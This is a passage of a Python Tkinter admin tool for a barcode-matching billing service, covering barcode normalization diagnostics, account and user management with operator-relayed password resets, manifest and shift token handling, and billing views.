        # dict keys -- normalize back to int here so both modes behave
        # identically from this point on (local mode's keys are already
        # int, so this is a no-op there).
        result["norm_keys"] = {int(t): v for t, v in result["norm_keys"].items()}
        result["candidates"] = {int(t): v for t, v in result["candidates"].items()}
        s = result["scan"]
        lines = []
        lines.append(f"scan uuid: {s['uuid']}")
        lines.append(f"result: {s['result']}    matched_tier (stored): {s['matched_tier']}")
        lines.append(f"decode_ms: {s['decode_ms']}    match_ms: {s['match_ms']}")
        lines.append(f"ts_client: {s['ts_client']}    ts_server: {s['ts_server']}")
        lines.append(f"bundle_version at scan time: {s['bundle_version']}")
        lines.append(f"worker: {result['worker']['display_name'] if result['worker'] else '?'}")
        lines.append(f"device: {s['device_ua']}")
        lines.append(f"account: {result['account']['name'] if result['account'] else '?'}")
        lines.append(f"shift: {result['shift']['label'] if result['shift'] else '?'}")
        lines.append("")
        lines.append("-- raw bytes --")
        lines.append(f"hex:   {result['raw_hex']}")
        lines.append(f"ascii: {result['raw_ascii']!r}")
        lines.append("")
        lines.append("-- GS1 fields (if any) --")
        lines.append(str(result["gs1"]) if result["gs1"] else "(not a GS1 element string)")
        lines.append("")
        lines.append("-- derived index keys by tier --")
        for tier in sorted(result["norm_keys"]):
            lines.append(
                f"  tier {tier} ({barcode.Tier(tier).name}): {result['norm_keys'][tier]!r}"
            )
        lines.append("")
        lines.append(
            "-- candidate manifest lines by tier (recomputed against the CURRENT manifest state) --"
        )
        for tier in sorted(result["candidates"]):
            ids = result["candidates"][tier]
            note = "  <-- resolved here" if tier == result["winning_tier"] else ""
            lines.append(
                f"  tier {tier} ({barcode.Tier(tier).name}): {len(ids)} candidate(s) {ids}{note}"
            )
        if result["winning_tier"] is None:
            lines.append("")
            lines.append(
                "No tier resolved uniquely at scan time (or currently) -- see the ambiguity guard."
            )
        text.insert("1.0", "\n".join(lines))

    app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 4: Normalizer playground
# ---------------------------------------------------------------------------


class NormalizerTab(ttk.Frame):
    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self._build()
        self._load_accounts()

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        ttk.Label(top, text="Account:").pack(side="left")
        self.account_combo = ttk.Combobox(top, state="readonly", width=30)
        self.account_combo.pack(side="left", padx=6)
        self.hex_mode = tk.BooleanVar(value=False)
        ttk.Checkbutton(
            top, text="Hex input mode (space-separated bytes)", variable=self.hex_mode
        ).pack(side="left", padx=10)

        input_frame = ttk.LabelFrame(self, text="Barcode", padding=6)
        input_frame.pack(fill="x", padx=6, pady=4)
        self.input_entry = ttk.Entry(input_frame, font=("TkFixedFont", 11))
        self.input_entry.pack(fill="x")
        ttk.Button(input_frame, text="Normalize + match", command=self._run).pack(
            anchor="e", pady=4
        )

        diff_frame = ttk.LabelFrame(self, text="Diff mode", padding=6)
        diff_frame.pack(fill="x", padx=6, pady=4)
        self.diff_a = ttk.Entry(diff_frame, font=("TkFixedFont", 10))
        self.diff_a.pack(fill="x", pady=2)
        self.diff_b = ttk.Entry(diff_frame, font=("TkFixedFont", 10))
        self.diff_b.pack(fill="x", pady=2)
        ttk.Button(diff_frame, text="Diff", command=self._diff).pack(anchor="e", pady=4)

        self.output = scrolledtext.ScrolledText(self, wrap="word", font=("TkFixedFont", 10))
        self.output.pack(fill="both", expand=True, padx=6, pady=4)

    def _load_accounts(self):
        def work():
            return self.app.call("list_accounts")

        def apply(rows):
            if is_error(rows):
                return
            self._accounts = {f"{r['id']}: {r['name']}": r["id"] for r in rows}
            self.account_combo.configure(values=list(self._accounts.keys()))
            if rows:
                self.account_combo.current(0)

        self.app.run_async(work, apply)

    def _decode_input(self, raw: str) -> str:
        if self.hex_mode.get():
            parts = raw.split()
            return "".join(chr(int(p, 16)) for p in parts)
        return raw

    def _run(self):
        raw = self._decode_input(self.input_entry.get())
        label = self.account_combo.get()
        account_id = self._accounts.get(label) if hasattr(self, "_accounts") else None

        def work():
            return self.app.call("normalizer_match", raw=raw, account_id=account_id)

        def apply(result):
            if is_error(result):
                self.output.delete("1.0", "end")
                self.output.insert("1.0", str(result))
                return
            # See the note in open_forensic_panel: remote mode's JSON round
            # trip stringifies dict keys, so normalize tier keys back to
            # int here -- a no-op in local mode, where they're already int.
            keys = {int(t): v for t, v in result["keys"].items()}
            match = result["match"]
            if match:
                match = dict(match)
                match["candidates_by_tier"] = {
                    int(t): v for t, v in match["candidates_by_tier"].items()
                }
            lines = []
            lines.append(f"raw:              {raw!r}")
            lines.append(f"control-stripped: {barcode.strip_control_chars(raw)!r}")
            lines.append(f"normalized:       {result['normalized']!r}")
            if result["gs1"]:
                lines.append(f"GS1 fields:       {result['gs1']}")
            if result["gtin_info"]:
                gi = result["gtin_info"]
                lines.append(f"GTIN-14:          {gi['gtin14']}  (check_valid={gi['check_valid']})")
                lines.append(f"body_no_check:    {gi['body_no_check']}")
            lines.append("")
            lines.append("keys by tier:")
            for tier_int, key in sorted(keys.items()):
                tier = barcode.Tier(tier_int)
                marker = ""
                if match and match["tier"] == tier_int:
                    marker = "  <-- WINNING TIER"
                lines.append(f"  tier {tier_int} ({tier.name}): {key!r}{marker}")
            lines.append("")
            if match is None:
                lines.append("(pick an account to see live matching)")
            elif match["is_resolved"]:
                tier = barcode.Tier(match["tier"])
                lines.append(
                    f"MATCHED at tier {match['tier']} ({tier.name}) -> manifest_line_id {match['manifest_line_id']}"
                )
                if match["needs_confirmation"]:
                    lines.append(
                        "(tier 6 -- requires owner confirmation before this counts toward billing)"
                    )
            else:
                lines.append("UNRESOLVED -- no tier produced exactly one candidate.")
                for tier_int, ids in match["candidates_by_tier"].items():
                    if ids:
                        tier = barcode.Tier(tier_int)
                        lines.append(
                            f"  tier {tier_int} ({tier.name}): {len(ids)} candidates {ids}"
                        )
            self.output.delete("1.0", "end")
            self.output.insert("1.0", "\n".join(lines))

        self.app.run_async(work, apply)

    def _diff(self):
        a = self._decode_input(self.diff_a.get())
        b = self._decode_input(self.diff_b.get())
        norm_a = barcode.normalize(a)
        norm_b = barcode.normalize(b)

        lines = [f"A: {a!r}", f"B: {b!r}", ""]
        divergence_index = next(
            (i for i, (ca, cb) in enumerate(zip(a, b, strict=False)) if ca != cb),
            min(len(a), len(b)),
        )
        lines.append(f"First byte-level divergence at index {divergence_index}")
        lines.append("")
        lines.append("Tier-by-tier comparison:")
        stopped_at = None
        for tier in barcode.TIER_ORDER:
            ka = norm_a.key_for(tier)
            kb = norm_b.key_for(tier)
            same = ka is not None and ka == kb
            lines.append(
                f"  tier {int(tier)} ({tier.name}): A={ka!r}  B={kb!r}  {'SAME' if same else 'DIFFERENT'}"
            )
            if not same and stopped_at is None and (ka is not None or kb is not None):
                stopped_at = tier
        if stopped_at is not None:
            lines.append("")
            lines.append(
                f"These two codes would stop matching each other at tier {int(stopped_at)} ({stopped_at.name})."
            )
        else:
            lines.append("")
            lines.append(
                "These two codes produce identical keys at every tier they both qualify for."
            )

        self.output.delete("1.0", "end")
        self.output.insert("1.0", "\n".join(lines))


def show_credential_window(app: AdminApp, title: str, label_text: str, value: str) -> tk.Toplevel:
    """A one-time display of a generated password (new account, new user,
    or a reset) with a copy-to-clipboard button. Shared by every flow that
    hands an operator a credential to relay back manually -- nothing here
    is ever emailed automatically."""
    win = DialogWindow(app)
    win.title(title)
    ttk.Label(win, text=label_text, padding=(10, 10, 10, 0)).pack(anchor="w")
    # Keep a live reference on the window itself -- a StringVar with no
    # surviving Python reference gets garbage collected, and its __del__
    # unsets the underlying Tcl variable, which would silently blank the
    # entry below.
    win.cred_var = tk.StringVar(value=value)
    entry = ttk.Entry(
        win, textvariable=win.cred_var, width=30, font=("TkFixedFont", 12), state="readonly"
    )
    entry.pack(padx=10, pady=6)

    def copy_to_clipboard():
        app.clipboard_clear()
        app.clipboard_append(value)

    ttk.Button(win, text="Copy to clipboard", command=copy_to_clipboard).pack(pady=(0, 10))
    ttk.Label(
        win,
        text="Relay this to the user yourself (e.g. reply to their email).\nIt will not be shown again.",
        foreground="#6b7280",
        padding=(10, 0, 10, 10),
    ).pack(anchor="w")
    return win


# ---------------------------------------------------------------------------
# Tab 5: Accounts
# ---------------------------------------------------------------------------


class AccountsTab(ttk.Frame):
    COLUMNS: ClassVar[list[str]] = [
        "id",
        "name",
        "plan",
        "price_per_catch_cents",
        "free_allowance",
        "status",
    ]

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self.selected_account_id: int | None = None
        self._build()
        self.refresh()

    def _build(self):
        pane = ttk.PanedWindow(self, orient="horizontal")
        pane.pack(fill="both", expand=True)

        left = ttk.Frame(pane)
        pane.add(left, weight=1)
        self.tree = ttk.Treeview(left, columns=self.COLUMNS, show="headings")
        for col in self.COLUMNS:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=100)
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        left_btns = ttk.Frame(left)
        left_btns.pack(fill="x")
        ttk.Button(left_btns, text="Refresh", command=self.refresh).pack(
            side="left", fill="x", expand=True
        )
        ttk.Button(left_btns, text="New account...", command=self._new_account).pack(
            side="left", fill="x", expand=True
        )

        right = ttk.Frame(pane, padding=10)
        pane.add(right, weight=1)

        self.detail_vars = {}
        for i, (key, label) in enumerate(
            [
                ("name", "Name"),
                ("plan", "Plan"),
                ("price_per_catch_cents", "Price per catch (cents)"),
                ("free_allowance", "Free allowance"),
                ("loose_suffix_len", "Loose suffix length"),
            ]
        ):
            ttk.Label(right, text=label).grid(row=i, column=0, sticky="w", pady=3)
            var = tk.StringVar()
            ttk.Entry(right, textvariable=var, width=30).grid(row=i, column=1, pady=3, sticky="ew")
            self.detail_vars[key] = var

        ttk.Label(right, text="Timezone").grid(row=5, column=0, sticky="w", pady=3)
        self.timezone_var = tk.StringVar()
        ttk.Combobox(
            right, textvariable=self.timezone_var, values=tz.COMMON_TIMEZONES, width=28
        ).grid(row=5, column=1, pady=3, sticky="ew")

        self.loose_match_var = tk.BooleanVar()
        ttk.Checkbutton(
            right, text="Loose matching (tier 6) enabled", variable=self.loose_match_var
        ).grid(row=6, column=0, columnspan=2, sticky="w", pady=3)
        self.worker_self_resolve_var = tk.BooleanVar()
        ttk.Checkbutton(
            right,
            text="Workers may self-resolve unmatched scans",
            variable=self.worker_self_resolve_var,
        ).grid(row=7, column=0, columnspan=2, sticky="w", pady=3)

        ttk.Button(right, text="Save changes", command=self._save).grid(
            row=8, column=0, pady=10, sticky="w"
        )
        self.status_btn = ttk.Button(right, text="Suspend", command=self._toggle_status)
        self.status_btn.grid(row=8, column=1, pady=10, sticky="e")

        credit_frame = ttk.LabelFrame(right, text="Grant credit", padding=8)
        credit_frame.grid(row=9, column=0, columnspan=2, sticky="ew", pady=10)
        ttk.Label(credit_frame, text="Amount (cents)").grid(row=0, column=0, sticky="w")
        self.credit_amount = ttk.Entry(credit_frame, width=12)
        self.credit_amount.grid(row=0, column=1, sticky="w")
        ttk.Label(credit_frame, text="Reason").grid(row=1, column=0, sticky="w")
        self.credit_reason = ttk.Entry(credit_frame, width=30)
        self.credit_reason.grid(row=1, column=1, sticky="w")
        ttk.Button(credit_frame, text="Grant", command=self._grant_credit).grid(
            row=2, column=0, columnspan=2, pady=4
        )

        impersonate_frame = ttk.LabelFrame(right, text="Impersonate", padding=8)
        impersonate_frame.grid(row=10, column=0, columnspan=2, sticky="ew", pady=10)
        ttk.Button(
            impersonate_frame, text="Generate 5-minute login link", command=self._impersonate
        ).pack(anchor="w")
        self.impersonate_link_var = tk.StringVar()
        ttk.Entry(
            impersonate_frame, textvariable=self.impersonate_link_var, width=60, state="readonly"
        ).pack(fill="x", pady=4)

        users_frame = ttk.LabelFrame(right, text="Users", padding=8)
        users_frame.grid(row=11, column=0, columnspan=2, sticky="ew", pady=10)
        ttk.Label(
            users_frame,
            text="Password reset is operator-mediated: the owner emails from their\n"
            "signup address, you verify it and generate a new password here to relay back.",
            foreground="#6b7280",
            font=("TkDefaultFont", 8),
        ).pack(anchor="w", pady=(0, 6))
        self.users_tree = ttk.Treeview(
            users_frame, columns=("email", "role"), show="headings", height=3
        )
        for col, width in [("email", 220), ("role", 80)]:
            self.users_tree.heading(col, text=col)
            self.users_tree.column(col, width=width)
        self.users_tree.pack(fill="x")
        user_btns = ttk.Frame(users_frame)
        user_btns.pack(fill="x", pady=(6, 0))
        ttk.Button(user_btns, text="Add user...", command=self._add_user).pack(side="left")
        ttk.Button(user_btns, text="Edit selected user...", command=self._edit_user).pack(
            side="left", padx=6
        )
        ttk.Button(user_btns, text="Delete selected user", command=self._delete_user).pack(
            side="left"
        )
        ttk.Button(
            user_btns, text="Reset password for selected user...", command=self._reset_password
        ).pack(side="left", padx=6)

        right.columnconfigure(1, weight=1)

    def refresh(self):
        def work():
            return self.app.call("list_accounts")

        def apply(rows):
            if is_error(rows):
                return
            for item in self.tree.get_children():
                self.tree.delete(item)
            for row in rows:
                self.tree.insert(
                    "", "end", iid=str(row["id"]), values=[row[c] for c in self.COLUMNS]
                )

        self.app.run_async(work, apply)

    def _on_select(self, _evt=None):
        sel = self.tree.selection()
        if not sel:
            return
        self.selected_account_id = int(sel[0])

        def work():
            return self.app.call("account_detail", account_id=self.selected_account_id)

        def apply(result):
            if is_error(result):
                return
            row, users = result["account"], result["users"]
            if not row:
                return
            self.detail_vars["name"].set(row["name"])
            self.detail_vars["plan"].set(row["plan"])
            self.detail_vars["price_per_catch_cents"].set(str(row["price_per_catch_cents"]))
            self.detail_vars["free_allowance"].set(str(row["free_allowance"]))
            self.detail_vars["loose_suffix_len"].set(str(row["loose_suffix_len"]))
            self.loose_match_var.set(bool(row["loose_match_enabled"]))
            self.worker_self_resolve_var.set(bool(row["worker_self_resolve"]))
            self.timezone_var.set(row["timezone"])
            self.status_btn.configure(
                text="Reactivate" if row["status"] == "suspended" else "Suspend"
            )

            for item in self.users_tree.get_children():
                self.users_tree.delete(item)
            for u in users:
                self.users_tree.insert("", "end", iid=str(u["id"]), values=(u["email"], u["role"]))

        self.app.run_async(work, apply)

    def _reset_password(self):
        sel = self.users_tree.selection()
        if not sel:
            messagebox.showinfo("Reset password", "Select a user from the list first.")
            return
        user_id = int(sel[0])
        email = self.users_tree.item(sel[0], "values")[0]
        if not messagebox.askyesno(
            "Reset password",
            f"Generate a new password for {email}?\n\n"
            "Only do this after verifying the request came from the same email "
            "address they signed up with -- you'll need to relay the new password "
            "back to them yourself; nothing is emailed automatically.",
        ):
            return

        def work():
            return self.app.call_action("user.password_reset", user_id=user_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Reset password", str(result))
                return
            show_credential_window(
                self.app, "New password", f"New password for {email}:", result["password"]
            )

        self.app.run_async(work, apply)

    def _new_account(self):
        win = DialogWindow(self.app)
        win.title("New account")
        fields = {}
        for i, (key, label, default) in enumerate(
            [
                ("name", "Business name", ""),
                ("email", "Owner email", ""),
                (
                    "price_per_catch_cents",
                    "Price per catch (cents)",
                    str(pricing.DEFAULT_PRICE_PER_CATCH_CENTS),
                ),
                ("free_allowance", "Free allowance", str(pricing.DEFAULT_FREE_ALLOWANCE)),
            ]
        ):
            ttk.Label(win, text=label).grid(row=i, column=0, sticky="w", padx=10, pady=4)
            var = tk.StringVar(value=default)
            ttk.Entry(win, textvariable=var, width=32).grid(row=i, column=1, padx=10, pady=4)
            fields[key] = var
        win.field_vars = fields  # exposed for tests to drive directly
        ttk.Label(win, text="Timezone").grid(row=4, column=0, sticky="w", padx=10, pady=4)
        # Kept on the window itself for the same reason show_credential_window
        # pins its StringVar there -- an unreferenced Tk variable is
        # garbage-collected and its __del__ unsets the Tcl variable.
        win.tz_var = tk.StringVar(value="UTC")
        ttk.Combobox(win, textvariable=win.tz_var, values=tz.COMMON_TIMEZONES, width=29).grid(
            row=4, column=1, padx=10, pady=4
        )

        def submit():
            name = fields["name"].get().strip()
            email = fields["email"].get().strip().lower()
            if not name or not email:
                messagebox.showerror("New account", "Business name and owner email are required.")
                return
            try:
                price_cents = int(fields["price_per_catch_cents"].get())
                free_allowance = int(fields["free_allowance"].get())
            except ValueError:
                messagebox.showerror(
                    "New account", "Price per catch and free allowance must be whole numbers."
                )
                return
            account_timezone = tz.normalize_timezone(win.tz_var.get())

            def work():
                return self.app.call_action(
                    "account.create",
                    name=name,
                    email=email,
                    price_per_catch_cents=price_cents,
                    free_allowance=free_allowance,
                    timezone=account_timezone,
                )

            def apply(result):
                if is_error(result):
                    messagebox.showerror("New account", str(result))
                    return
                win.destroy()
                self.refresh()
                show_credential_window(
                    self.app,
                    "Account created",
                    f"Owner login password for {result['email']}:",
                    result["password"],
                )

            self.app.run_async(work, apply)

        ttk.Button(win, text="Create", command=submit).grid(row=5, column=0, columnspan=2, pady=10)

    def _add_user(self):
        if not self.selected_account_id:
            messagebox.showinfo("Add user", "Select an account first.")
            return
        account_id = self.selected_account_id
        win = DialogWindow(self.app)
        win.title("Add user")
        ttk.Label(win, text="Email").grid(row=0, column=0, sticky="w", padx=10, pady=4)
        win.email_var = tk.StringVar()
        ttk.Entry(win, textvariable=win.email_var, width=30).grid(row=0, column=1, padx=10, pady=4)
        ttk.Label(win, text="Role").grid(row=1, column=0, sticky="w", padx=10, pady=4)
        win.role_var = tk.StringVar(value="manager")
        ttk.Combobox(
            win, textvariable=win.role_var, values=["owner", "manager"], state="readonly", width=27
        ).grid(row=1, column=1, padx=10, pady=4)

        def submit():
            email = win.email_var.get().strip().lower()
            role = win.role_var.get()
            if not email:
                messagebox.showerror("Add user", "Email is required.")
                return

            def work():
                return self.app.call_action(
                    "user.create", account_id=account_id, email=email, role=role
                )

            def apply(result):
                if is_error(result):
                    messagebox.showerror("Add user", str(result))
                    return
                win.destroy()
                self._on_select()
                show_credential_window(
                    self.app, "User added", f"Password for {result['email']}:", result["password"]
                )

            self.app.run_async(work, apply)

        ttk.Button(win, text="Add", command=submit).grid(row=2, column=0, columnspan=2, pady=10)

    def _edit_user(self):
        sel = self.users_tree.selection()
        if not sel:
            messagebox.showinfo("Edit user", "Select a user from the list first.")
            return
        user_id = int(sel[0])
        # Treeview.item(..., "values") returns the row's column tuple;
        # typeshed types it loosely, so name the shape here.
        values = tuple(self.users_tree.item(sel[0], "values"))
        current_email, current_role = values[0], values[1]

        win = DialogWindow(self.app)
        win.title("Edit user")
        ttk.Label(win, text="Email").grid(row=0, column=0, sticky="w", padx=10, pady=4)
        win.email_var = tk.StringVar(value=current_email)
        ttk.Entry(win, textvariable=win.email_var, width=30).grid(row=0, column=1, padx=10, pady=4)
        ttk.Label(win, text="Role").grid(row=1, column=0, sticky="w", padx=10, pady=4)
        win.role_var = tk.StringVar(value=current_role)
        ttk.Combobox(
            win, textvariable=win.role_var, values=["owner", "manager"], state="readonly", width=27
        ).grid(row=1, column=1, padx=10, pady=4)

        def submit():
            new_email = win.email_var.get().strip().lower()
            new_role = win.role_var.get()
            if not new_email:
                messagebox.showerror("Edit user", "Email is required.")
                return

            def work():
                # Validation (email uniqueness, last-owner demotion) and
                # the audit-before-mutation ordering for each changed
                # field live server side in admin_api.act_user_update now
                # -- see that function for the exact rules this used to
                # apply locally.
                return self.app.call_action(
                    "user.update", user_id=user_id, email=new_email, role=new_role
                )

            def apply(result):
                if is_error(result):
                    messagebox.showerror("Edit user", str(result))
                    return
                win.destroy()
                self._on_select()

            self.app.run_async(work, apply)

        ttk.Button(win, text="Save", command=submit).grid(row=2, column=0, columnspan=2, pady=10)

    def _delete_user(self):
        sel = self.users_tree.selection()
        if not sel:
            messagebox.showinfo("Delete user", "Select a user from the list first.")
            return
        user_id = int(sel[0])
        email = self.users_tree.item(sel[0], "values")[0]
        if not messagebox.askyesno(
            "Delete user", f"Delete {email}? This logs them out immediately and cannot be undone."
        ):
            return

        def work():
            return self.app.call_action("user.delete", user_id=user_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Delete user", str(result))
            else:
                self._on_select()

        self.app.run_async(work, apply)

    def _save(self):
        if not self.selected_account_id:
            return
        account_id = self.selected_account_id
        try:
            fields = {
                "name": self.detail_vars["name"].get(),
                "plan": self.detail_vars["plan"].get(),
                "price_per_catch_cents": int(self.detail_vars["price_per_catch_cents"].get()),
                "free_allowance": int(self.detail_vars["free_allowance"].get()),
                "loose_suffix_len": max(
                    int(self.detail_vars["loose_suffix_len"].get()), barcode.MIN_SUFFIX_LEN
                ),
                "loose_match_enabled": int(self.loose_match_var.get()),
                "worker_self_resolve": int(self.worker_self_resolve_var.get()),
                "timezone": tz.normalize_timezone(self.timezone_var.get()),
            }
        except ValueError as e:
            messagebox.showerror("Accounts", f"Invalid value: {e}")
            return

        def work():
            return self.app.call_action("account.update", account_id=account_id, **fields)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Accounts", str(result))
            else:
                messagebox.showinfo("Accounts", "Saved.")
                self.refresh()

        self.app.run_async(work, apply)

    def _toggle_status(self):
        if not self.selected_account_id:
            return
        account_id = self.selected_account_id

        def work():
            return self.app.call_action("account.status", account_id=account_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Accounts", str(result))
            else:
                self.refresh()

        self.app.run_async(work, apply)

    def _grant_credit(self):
        if not self.selected_account_id:
            return
        try:
            cents = int(self.credit_amount.get())
        except ValueError:
            messagebox.showerror("Accounts", "Amount must be an integer number of cents.")
            return
        reason = self.credit_reason.get().strip()
        if not reason:
            messagebox.showerror("Accounts", "A reason is required.")
            return
        account_id = self.selected_account_id

        def work():
            return self.app.call_action(
                "account.grant_credit", account_id=account_id, cents=cents, reason=reason
            )

        def apply(result):
            if is_error(result):
                messagebox.showerror("Accounts", str(result))
            else:
                messagebox.showinfo("Accounts", "Credit granted.")
                self.credit_amount.delete(0, "end")
                self.credit_reason.delete(0, "end")

        self.app.run_async(work, apply)

    def _impersonate(self):
        if not self.selected_account_id:
            return
        account_id = self.selected_account_id

        def work():
            return self.app.call_action("account.impersonate_link", account_id=account_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Accounts", str(result))
                return
            url = f"{self.app.base_url}/impersonate/{result['token']}"
            self.impersonate_link_var.set(url)

        self.app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 6: Manifests & shifts
# ---------------------------------------------------------------------------


class ManifestsShiftsTab(ttk.Frame):
    MANIFEST_COLUMNS: ClassVar[list[str]] = [
        "id",
        "account_id",
        "ref",
        "status",
        "line_count",
        "bundle_version",
    ]
    SHIFT_COLUMNS: ClassVar[list[str]] = [
        "id",
        "label",
        "date",
        "bundle_version",
        "token_expires_at",
        "revoked_at",
    ]

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self.selected_manifest_id: int | None = None
        self.selected_shift_id: int | None = None
        self._build()
        self.refresh()

    def _build(self):
        top = ttk.PanedWindow(self, orient="vertical")
        top.pack(fill="both", expand=True)

        manifest_frame = ttk.LabelFrame(top, text="Manifests", padding=6)
        top.add(manifest_frame, weight=1)
        self.manifest_tree = ttk.Treeview(
            manifest_frame, columns=self.MANIFEST_COLUMNS, show="headings", height=8
        )
        for c in self.MANIFEST_COLUMNS:
            self.manifest_tree.heading(c, text=c)
            self.manifest_tree.column(c, width=100)
        self.manifest_tree.pack(fill="both", expand=True)
        self.manifest_tree.bind("<<TreeviewSelect>>", self._on_manifest_select)

        btns = ttk.Frame(manifest_frame)
        btns.pack(fill="x", pady=4)
        ttk.Button(btns, text="Refresh", command=self.refresh).pack(side="left")
        ttk.Button(btns, text="Regenerate keys", command=self._regenerate_keys).pack(
            side="left", padx=6
        )

        self.collision_text = scrolledtext.ScrolledText(manifest_frame, height=6, wrap="word")
        self.collision_text.pack(fill="x")

        shift_frame = ttk.LabelFrame(top, text="Shifts", padding=6)
        top.add(shift_frame, weight=1)
        self.shift_tree = ttk.Treeview(
            shift_frame, columns=self.SHIFT_COLUMNS, show="headings", height=8
        )
        for c in self.SHIFT_COLUMNS:
            self.shift_tree.heading(c, text=c)
            self.shift_tree.column(c, width=110)
        self.shift_tree.pack(fill="both", expand=True)
        self.shift_tree.bind("<<TreeviewSelect>>", self._on_shift_select)

        shift_btns = ttk.Frame(shift_frame)
        shift_btns.pack(fill="x", pady=4)
        ttk.Button(shift_btns, text="Revoke token", command=self._revoke_shift).pack(side="left")
        ttk.Button(shift_btns, text="Render wall QR to PNG...", command=self._render_qr).pack(
            side="left", padx=6
        )

    def refresh(self):
        def work():
            return self.app.call("manifests_and_shifts")

        def apply(result):
            if is_error(result):
                return
            manifests, shifts = result["manifests"], result["shifts"]
            for item in self.manifest_tree.get_children():
                self.manifest_tree.delete(item)
            for row in manifests:
                self.manifest_tree.insert(
                    "", "end", iid=str(row["id"]), values=[row[c] for c in self.MANIFEST_COLUMNS]
                )
            for item in self.shift_tree.get_children():
                self.shift_tree.delete(item)
            for row in shifts:
                self.shift_tree.insert(
                    "", "end", iid=str(row["id"]), values=[row[c] for c in self.SHIFT_COLUMNS]
                )

        self.app.run_async(work, apply)

    def _on_manifest_select(self, _evt=None):
        sel = self.manifest_tree.selection()
        if not sel:
            return
        self.selected_manifest_id = int(sel[0])

        def work():
            return self.app.call("manifest_collisions", manifest_id=self.selected_manifest_id)

        def apply(report):
            self.collision_text.delete("1.0", "end")
            if is_error(report):
                self.collision_text.insert("1.0", str(report))
                return
            warnings = report["warnings"]
            if not warnings:
                self.collision_text.insert("1.0", "No collisions detected on this manifest.")
            else:
                self.collision_text.insert("1.0", "\n".join(warnings))

        self.app.run_async(work, apply)

    def _regenerate_keys(self):
        if not self.selected_manifest_id:
            return
        manifest_id = self.selected_manifest_id

        def work():
            return self.app.call_action("manifest.regenerate_keys", manifest_id=manifest_id)

        def apply(report):
            if is_error(report):
                messagebox.showerror("Manifests", str(report))
            else:
                messagebox.showinfo(
                    "Manifests",
                    "Keys regenerated. Any shifts using this manifest have had their bundle_version bumped.",
                )
                self.refresh()

        self.app.run_async(work, apply)

    def _on_shift_select(self, _evt=None):
        sel = self.shift_tree.selection()
        if sel:
            self.selected_shift_id = int(sel[0])

    def _revoke_shift(self):
        if not self.selected_shift_id:
            return
        shift_id = self.selected_shift_id
        if not messagebox.askyesno(
            "Revoke", "Revoke this shift's token? Workers will not be able to join or sync."
        ):
            return

        def work():
            return self.app.call_action("shift.revoke", shift_id=shift_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Shifts", str(result))
            else:
                self.refresh()

        self.app.run_async(work, apply)

    def _render_qr(self):
        if not self.selected_shift_id:
            return
        shift_id = self.selected_shift_id
        path = filedialog.asksaveasfilename(
            defaultextension=".png", initialfile=f"shift-{shift_id}-qr.png"
        )
        if not path:
            return

        def work():
            token = self.app.call("shift_join_token", shift_id=shift_id)["token"]
            url = f"{self.app.base_url}/w/join?t={token}"
            qr = segno.make(url)
            qr.save(path, kind="png", scale=10, border=3, dark="#14171a", light="#ffffff")
            return url

        def apply(result):
            if is_error(result):
                messagebox.showerror("Shifts", str(result))
            else:
                messagebox.showinfo("Shifts", f"Saved QR for {result} to {path}")

        self.app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 7: Billing
# ---------------------------------------------------------------------------


class BillingTab(ttk.Frame):
    COLUMNS: ClassVar[list[str]] = [
        "id",
        "scan_uuid",
        "kind",
        "cents",
        "billable",
        "created_at",
        "reversal_reason",
    ]

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self.selected_event_id: int | None = None
        self._build()
        self._load_accounts()

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        ttk.Label(top, text="Account:").pack(side="left")
        self.account_combo = ttk.Combobox(top, state="readonly", width=30)
        self.account_combo.pack(side="left", padx=6)
        self.account_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())
        ttk.Button(top, text="Refresh", command=self._refresh).pack(side="left", padx=6)
        ttk.Button(top, text="Export CSV for invoicing", command=self._export_csv).pack(
            side="left", padx=6
        )
        self.summary_label = ttk.Label(top, text="")
        self.summary_label.pack(side="right")

        self.tree = ttk.Treeview(self, columns=self.COLUMNS, show="headings")
        for c in self.COLUMNS:
            self.tree.heading(c, text=c)
            self.tree.column(c, width=110)
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._on_select)

        bottom = ttk.Frame(self, padding=6)
        bottom.pack(fill="x")
        ttk.Button(bottom, text="Reverse selected event...", command=self._reverse).pack(
            side="left"
        )
        ttk.Button(bottom, text="Generate savings report...", command=self._generate_report).pack(
            side="left", padx=6
        )
        ttk.Button(
            bottom, text="Generate reports for all accounts...", command=self._generate_all_reports
        ).pack(side="left", padx=6)

    def _load_accounts(self):
        def work():
            return self.app.call("list_accounts")

        def apply(rows):
            if is_error(rows):
                return
            self._accounts = {f"{r['id']}: {r['name']}": r["id"] for r in rows}
            self.account_combo.configure(values=list(self._accounts.keys()))
            if rows:
                self.account_combo.current(0)
                self._refresh()

        self.app.run_async(work, apply)

    def _current_account_id(self):
        label = self.account_combo.get()
        return self._accounts.get(label) if hasattr(self, "_accounts") else None

    def _refresh(self):
        account_id = self._current_account_id()
        if not account_id:
            return

        def work():
            return self.app.call("billing_summary", account_id=account_id)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Billing", str(result))
                return
            events, net, savings = (
                result["events"],
                result["net_owed_cents"],
                result["savings_cents"],
            )
            for item in self.tree.get_children():
                self.tree.delete(item)
            for row in events:
                self.tree.insert(
                    "", "end", iid=str(row["id"]), values=[row[c] for c in self.COLUMNS]
                )
            self.summary_label.configure(
                text=f"Net owed: {pricing.format_cents_as_dollars(net)}    Money saved: {pricing.format_cents_as_dollars(savings)}"
            )

        self.app.run_async(work, apply)

    def _on_select(self, _evt=None):
        sel = self.tree.selection()
